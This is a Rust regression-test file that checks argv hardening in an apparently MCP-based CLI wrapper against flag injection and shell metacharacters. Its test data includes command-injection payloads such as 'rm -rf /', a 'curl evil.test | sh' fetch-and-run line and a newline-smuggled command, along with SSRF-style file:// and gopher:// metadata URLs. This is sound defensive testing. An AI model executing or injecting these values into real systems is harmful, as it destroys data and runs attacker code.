//! Argv hardening (SECURITY): nothing a caller supplies becomes a flag or an extra token.
mod common;
use common::args::params;

use serde_json::json;
use stencil_mcp::args::build_argv;

// ── argv-hardening / SECURITY regressions ──
// argv is an array, never a shell line: the one vector left is flag injection via `output`.

#[test]
fn dash_leading_output_is_rejected_no_flag_injection() {
    // Without the guard these would ride the positional slot as flags — `-l` would even
    // swallow the next token as a layout path.
    for bad in ["--album", "-l", "-r", "--filter", "-i", "--server", "-", "--"] {
        let p = params(json!({ "input": "a.png", "output": bad }));
        let err = build_argv(&p, None).unwrap_err().to_string();
        assert!(
            err.contains("must not start with '-'"),
            "output {bad:?} should be rejected, got: {err}"
        );
    }
}

#[test]
fn ordinary_output_paths_are_accepted() {
    // The guard keys off a leading dash only — normal paths (including a leading-dash file
    // name reached via a directory prefix) still pass through as the final operand.
    for good in ["out.png", "./out.png", "sub/-weird.png", "/abs/out.png", "a-b.png"] {
        let p = params(json!({ "input": "a.png", "output": good }));
        let argv = build_argv(&p, None).unwrap();
        assert_eq!(argv.last().unwrap(), good, "output {good:?} should ride argv");
    }
}

#[test]
fn non_http_input_passes_through_as_single_inert_token() {
    // `build_argv` does no scheme/host SSRF validation — the CLI enforces that. Here a
    // non-http `input` rides through verbatim as one argv token.
    for input in [
        "file:///etc/passwd",
        "ftp://host/x",
        "gopher://169.254.169.254/",
        "/etc/passwd",
    ] {
        let p = params(json!({ "input": input, "output": "out.png" }));
        let argv = build_argv(&p, None).unwrap();
        let i = argv.iter().position(|a| a == "-i").unwrap();
        assert_eq!(argv[i + 1], input, "input {input:?} should ride as one token");
    }
}

#[test]
fn non_http_server_and_remote_pass_through_as_single_inert_tokens() {
    // Same contract for the collaboration-server URLs: no scheme validation in the builder
    // (the CLI validates downstream). Pin that each rides as a single argv token.
    let p = params(json!({
        "server": "file:///etc/passwd", "input": "Proj",
        "remote": "gopher://169.254.169.254/", "remote_name": "X", "output": "out.png"
    }));
    let argv = build_argv(&p, None).unwrap();
    let s = argv.iter().position(|a| a == "--server").unwrap();
    assert_eq!(argv[s + 1], "file:///etc/passwd");
    let r = argv.iter().position(|a| a == "--remote").unwrap();
    assert_eq!(argv[r + 1], "gopher://169.254.169.254/");
}

#[test]
fn hostile_input_with_shell_metacharacters_stays_one_argv_token() {
    // No shell is involved (the CLI is exec'd with an argv array), so metacharacters are
    // inert: each hostile value must stay exactly one argv element.
    for hostile in [
        "a.png; rm -rf /",
        "$(rm -rf /)",
        "`reboot`",
        "a.png && curl evil.test | sh",
        "a.png\nrm -rf /",
        "a.png | tee /etc/passwd",
    ] {
        let p = params(json!({
            "input": hostile, "crop": hostile, "filter": hostile, "output": "out.png"
        }));
        let argv = build_argv(&p, Some(hostile)).unwrap();

        let count = argv.iter().filter(|a| *a == hostile).count();
        assert_eq!(count, 4, "hostile {hostile:?} should appear as 4 whole tokens (-i/-c/-l/--filter values)");

        let i = argv.iter().position(|a| a == "-i").unwrap();
        assert_eq!(argv[i + 1], hostile);
        let c = argv.iter().position(|a| a == "-c").unwrap();
        assert_eq!(argv[c + 1], hostile);
        let l = argv.iter().position(|a| a == "-l").unwrap();
        assert_eq!(argv[l + 1], hostile);
        let f = argv.iter().position(|a| a == "--filter").unwrap();
        assert_eq!(argv[f + 1], hostile);
    }
}
